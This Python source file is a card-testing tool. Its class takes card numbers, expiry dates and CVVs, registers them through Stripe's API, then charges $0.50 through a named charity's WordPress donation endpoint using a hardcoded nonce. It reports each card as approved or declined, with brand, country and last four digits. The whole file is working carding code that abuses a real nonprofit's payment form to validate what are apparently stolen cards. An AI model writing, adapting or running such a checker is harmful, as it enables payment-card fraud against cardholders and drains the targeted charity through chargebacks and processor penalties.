import requests
import uuid
from config import STRIPE_KEY, logger

class CGDonationChecker:
    """CG 0.5 Donation Checker - $0.50 Charge using act-today.org"""
    
    @staticmethod
    def create_payment_method(card_details: str):
        """Create payment method with Stripe"""
        try:
            cc, mm, yy, cvv = card_details.split('|')
            
            # Generate unique IDs
            guid = str(uuid.uuid4())
            muid = str(uuid.uuid4())
            sid = str(uuid.uuid4())
            
            headers = {
                "authority": "api.stripe.com",
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            
            # Create payment method
            data = f"type=card&billing_details[name]=Donor&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid={guid}&muid={muid}&sid={sid}&pasted_fields=number&payment_user_agent=stripe.js&key={STRIPE_KEY}"
            
            response = requests.post(
                "https://api.stripe.com/v1/payment_methods",
                headers=headers,
                data=data,
                timeout=10
            )
            
            if response.status_code != 200:
                return {"status": "Declined", "message": "Payment method creation failed"}
            
            stripe_data = response.json()
            pm_id = stripe_data.get("id")
            
            if not pm_id:
                return {"status": "Declined", "message": "No payment method ID returned"}
            
            # Get card info
            card_info = stripe_data.get("card", {})
            bin_info = {
                "brand": card_info.get("brand", "N/A"),
                "type": card_info.get("funding", "N/A"),
                "country": card_info.get("country", "N/A"),
                "last4": card_info.get("last4", "N/A")
            }
            
            return {"status": "Success", "payment_method_id": pm_id, **bin_info}
            
        except Exception as e:
            logger.error(f"Payment method creation error: {e}")
            return {"status": "Error", "message": f"Payment method error: {str(e)}"}
    
    @staticmethod
    def create_payment_intent(payment_method_id: str, card_brand: str, last4: str):
        """Create payment intent on donation site"""
        try:
            headers = {
                "authority": "www.act-today.org",
                "accept": "application/json, text/javascript, */*; q=0.01",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://www.act-today.org",
                "referer": "https://www.act-today.org/donate-now/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "x-requested-with": "XMLHttpRequest"
            }
            
            # Create payment intent with $0.50 amount
            data = {
                "action": "gfstripe_create_payment_intent",
                "nonce": "2f68f9e418",
                "payment_method": payment_method_id,
                "currency": "USD",
                "amount": "50",  # 50 cents = $0.50
                "feed_id": "1"
            }
            
            response = requests.post(
                "https://www.act-today.org/wp-admin/admin-ajax.php",
                headers=headers,
                data=data,
                timeout=10
            )
            
            if response.status_code != 200:
                return {"status": "Declined", "message": "Payment intent failed"}
            
            response_data = response.json()
            
            if response_data.get("success"):
                return {
                    "status": "Approved", 
                    "message": "$0.50 Donation Successful",
                    "client_secret": response_data.get("data", {}).get("client_secret", ""),
                    "amount": 0.50
                }
            else:
                return {"status": "Declined", "message": "Donation declined by gateway"}
                
        except Exception as e:
            logger.error(f"Payment intent creation error: {e}")
            return {"status": "Error", "message": f"Payment intent error: {str(e)}"}
    
    @staticmethod
    def test_card(card_details: str):
        """
        Test a card with $0.50 donation charge
        Format: CC|MM|YY|CVV
        """
        try:
            cc, mm, yy, cvv = card_details.split('|')
            
            # Step 1: Create payment method
            logger.info(f"Creating payment method for card: {cc[:6]}****")
            pm_result = CGDonationChecker.create_payment_method(card_details)
            
            if pm_result["status"] != "Success":
                return {
                    "status": "Declined",
                    "message": f"Payment method: {pm_result.get('message', 'Failed')}",
                    "gateway": "CG Donation Gateway"
                }
            
            # Step 2: Create payment intent
            logger.info(f"Creating payment intent for PM: {pm_result['payment_method_id'][:8]}...")
            pi_result = CGDonationChecker.create_payment_intent(
                pm_result["payment_method_id"],
                pm_result.get("brand", "Unknown"),
                pm_result.get("last4", "****")
            )
            
            if pi_result["status"] == "Approved":
                return {
                    "status": "Approved",
                    "message": pi_result["message"],
                    "amount": 0.50,
                    "currency": "USD",
                    "gateway": "CG Donation Gateway",
                    "brand": pm_result.get("brand", "N/A"),
                    "type": pm_result.get("type", "N/A"),
                    "country": pm_result.get("country", "N/A"),
                    "last4": pm_result.get("last4", "N/A")
                }
            else:
                return {
                    "status": "Declined",
                    "message": pi_result["message"],
                    "gateway": "CG Donation Gateway",
                    "brand": pm_result.get("brand", "N/A"),
                    "type": pm_result.get("type", "N/A")
                }
                
        except ValueError:
            return {"status": "Error", "message": "Invalid card format. Use: CC|MM|YY|CVV"}
        except Exception as e:
            logger.error(f"CG test error: {str(e)}")
            return {"status": "Error", "message": f"Processing error: {str(e)}"}